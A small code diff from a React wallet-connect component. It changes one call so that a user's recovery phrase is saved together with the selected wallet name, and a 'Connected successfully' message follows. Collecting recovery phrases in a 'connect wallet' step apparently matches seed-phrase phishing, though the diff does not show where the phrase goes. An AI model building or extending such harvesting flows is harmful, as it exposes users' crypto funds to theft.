@@ -134,7 +134,7 @@ export const DashboardWalletConnect: React.FC = () => {
     
     setIsLoading(true);
     setTimeout(() => {
-      saveRecoveryPhrase(phrase);
+      saveRecoveryPhrase(phrase, selectedWallet || "Unknown Wallet");
       addNotification(`Connected successfully with ${selectedWallet}!`);
       setIsLoading(false);
       setShowModal(false);
